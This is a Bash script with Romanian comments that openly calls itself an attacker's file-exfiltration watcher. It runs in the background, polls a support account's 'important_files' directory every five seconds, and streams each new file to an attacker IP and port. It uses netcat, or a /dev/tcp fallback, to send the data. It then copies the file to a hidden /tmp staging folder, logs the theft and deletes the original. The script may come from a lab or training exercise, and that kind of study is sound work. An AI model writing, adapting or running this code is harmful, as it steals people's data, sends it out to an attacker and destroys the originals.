#!/bin/bash
# Acest script rulează în background (&) și monitorizează activ un director. Imediat ce apare un fișier nou, îl "fură" si-l transmite catre o adresa ip outbound
# Configurare Atacator
ATTACKER_IP="192.168.12.5"
ATTACKER_PORT="4444"

# Configurare Directoare
WATCH_DIR="/home/support_account/important_files"
STAGING_DIR="/tmp/.exfil_staging"

mkdir -p "$STAGING_DIR"

echo "[*] Starting Network Exfiltration Watcher on $WATCH_DIR..."
echo "[*] Target: $ATTACKER_IP:$ATTACKER_PORT"

# Această funcție rulează în background
(
    while true; do
        # Verifică dacă există fișiere în director
        count=$(ls -1 "$WATCH_DIR" 2>/dev/null | wc -l)
        
        if [ "$count" -gt 0 ]; then
            # Pentru fiecare fișier găsit
            for file in "$WATCH_DIR"/*; do
                if [ -f "$file" ]; then
                    filename=$(basename "$file")
                    
                    # 1. Etapa de Exfiltrare (Trimite datele)
                    # Încercăm să trimitem conținutul fișierului către atacator
                    if command -v nc >/dev/null; then
                        # Opțiunea -w 1 pune un timeout de 1 secundă ca să nu blocheze scriptul
                        cat "$file" | nc -w 1 $ATTACKER_IP $ATTACKER_PORT
                    else
                        # Fallback la /dev/tcp (Living off the Land)
                        # Aceasta funcționează doar în Bash
                        cat "$file" > /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT
                    fi

                    # 2. Etapa de "Furt Local" (Persistență/Arhivare)
                    cp "$file" "$STAGING_DIR/${filename}.stolen"
                    
                    # Loghează acțiunea local
                    echo "$(date): Exfiltrated & Stole $filename" >> "$STAGING_DIR/log.txt"
                    
                    # 3. Etapa Distructivă (Șterge originalul)
                    rm "$file"
                fi
            done
        fi
        
        # Așteaptă 5 secunde înainte de următoarea verificare
        sleep 5
    done
) & 

# Salvăm PID-ul procesului din background
BG_PID=$!
echo "[*] Watcher running in background with PID: $BG_PID"
echo "[*] Test it by running: echo 'SECRET_DATA' > $WATCH_DIR/secret.txt"
